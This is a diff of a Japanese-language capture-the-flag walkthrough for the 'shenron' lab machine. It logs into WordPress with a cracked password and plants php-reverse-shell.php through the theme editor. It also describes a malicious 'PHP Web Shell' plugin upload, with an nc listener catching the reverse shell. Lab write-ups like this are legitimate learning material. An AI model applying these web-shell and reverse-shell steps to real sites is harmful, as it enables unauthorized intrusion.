@@ -24,12 +24,15 @@
   - passwordは`iloverockyou`であることがわかる 
 - wp-login.phpからダッシュボードに接続する
 - reverse-shellをする
-  - Appearance -> Editor -> archive.php
-  - ここにphp-reverse-shell.phpを書き込んで保存する
+  - Appearance -> Editor
+  - 右側にTemplatesがあって、その下に青文字でArchives(archive.php)がある。ちなみに404 Templateでもできる
+  - ここにあるのを全部削除して、php-reverse-shell.phpを書き込んで下にUpdate Fileがあるので保存する
   - Parrotで待ち受ける
   - `nc -nlvp 9001`
   - websiteから起動する
-  - `http://shenron/wp-content/themes/twentyeleven/archive.php`
+  - `http://shenron/wp-content/themes/twentyeleven/archive.php`または404 Templateに書いた場合はarchive.phpを404.phpにする
+  - これでもできない場合は、php-reverse-shellが間違っているので新しいのをとってくる。
+  - (追記)pluginでもできる。下に書いてある
 - ユーザを調べる
   - shenronがいる 
 - 設定ファイルを見る
@@ -63,3 +66,26 @@ cd /home/shenron
 ./network
 ```
 - rootになれる
+
+## 補足
+- pluginでする
+- php-reverse-shell.phpをコピーして名前をevil.phpにして用意しておく
+- 次のファイル、banner.phpを作る
+
+```
+<?
+/*
+Plugin Name: PHP Web Shell
+Version: 1.0.0
+Author: evil
+Author URI: http://evil
+*/
+?>
+```
+
+- この２つのファイルを圧縮する
+  - `zip evil evil.php banner.php`
+- wordpressにuploadする。Pluginsを押す。Add Newを押す。Upload Pluginを選択してブラウザからさっき作ったevil.zipを選択して、右にあるinstall nowを選択
+- Plugins一覧から、さっきUploadしたのをactivateすると色が変わる
+- Parrotで待ち受ける
+- ブラウザから次にアクセスする`http://shenron/wp-content/plugins/evil/evil.php` 
